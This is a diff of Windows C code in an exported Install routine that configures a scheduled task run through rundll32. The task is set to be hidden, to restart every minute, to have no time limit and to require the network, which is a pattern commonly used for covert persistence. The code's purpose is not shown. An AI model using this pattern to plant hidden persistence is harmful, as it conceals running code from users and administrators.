@@ -225,13 +225,78 @@ EXPORT(Install) {
 		dialogError(result, L"IExecAction::put_Arguments");
 		goto freeFunctionBuffer;
 	}
+	
+	ITaskSettings* taskSettings = NULL;
+	result = taskDefinition->lpVtbl->get_Settings(taskDefinition, &taskSettings);
 
-	//HI_SetActions(folder, definition, rundll32, programArgument.c_str());
-	/*HI_SetSettings(folder, definition);
-	HI_RegisterTask(folder, definition, L"Startup");
+	if(FAILED(result)) {
+		dialogError(result, L"ITaskDefinition::get_Settings");
+		goto freeFunctionBuffer;
+	}
+
+	result = taskSettings->lpVtbl->put_AllowDemandStart(taskSettings, VARIANT_TRUE);
+
+	if(FAILED(result)) {
+		dialogError(result, L"ITaskSettings::put_AllowDemandStart");
+		goto releaseTaskSettings;
+	}
+
+	result = taskSettings->lpVtbl->put_RestartInterval(taskSettings, L"PT1M");
+
+	if(FAILED(result)) {
+		dialogError(result, L"ITaskSettings::put_RestartInterval");
+		goto releaseTaskSettings;
+	}
+
+	result = taskSettings->lpVtbl->put_RestartCount(taskSettings, 5);
+
+	if(FAILED(result)) {
+		dialogError(result, L"ITaskSettings::put_RestartCount");
+		goto releaseTaskSettings;
+	}
+
+	result = taskSettings->lpVtbl->put_ExecutionTimeLimit(taskSettings, L"PT0M");
+
+	if(FAILED(result)) {
+		dialogError(result, L"ITaskSettings::put_ExecutionTimeLimit");
+		goto releaseTaskSettings;
+	}
+
+	result = taskSettings->lpVtbl->put_DisallowStartIfOnBatteries(taskSettings, VARIANT_FALSE);
+
+	if(FAILED(result)) {
+		dialogError(result, L"ITaskSettings::put_DisallowStartIfOnBatteries");
+		goto releaseTaskSettings;
+	}
+
+	result = taskSettings->lpVtbl->put_StopIfGoingOnBatteries(taskSettings, VARIANT_FALSE);
+
+	if(FAILED(result)) {
+		dialogError(result, L"ITaskSettings::put_StopIfGoingOnBatteries");
+		goto releaseTaskSettings;
+	}
+
+	result = taskSettings->lpVtbl->put_RunOnlyIfNetworkAvailable(taskSettings, VARIANT_TRUE);
+
+	if(FAILED(result)) {
+		dialogError(result, L"ITaskSettings::put_RunOnlyIfNetworkAvailable");
+		goto releaseTaskSettings;
+	}
+
+	result = taskSettings->lpVtbl->put_Hidden(taskSettings, VARIANT_TRUE);
+
+	if(FAILED(result)) {
+		dialogError(result, L"ITaskSettings::put_Hidden");
+		goto releaseTaskSettings;
+	}
+
+	//HI_SetSettings(taskFolder, taskDefinition);
+	/*HI_RegisterTask(folder, definition, L"Startup");
 	definition->Release();
 	folder->Release();*/
 	MessageBoxW(NULL, L"Status: OK", L"Information", MB_OK | MB_DEFBUTTON1 | MB_ICONINFORMATION | MB_SYSTEMMODAL);
+releaseTaskSettings:
+	taskSettings->lpVtbl->Release(taskSettings);
 freeFunctionBuffer:
 	free(functionBuffer);
 freeRundll32PathBuffer:
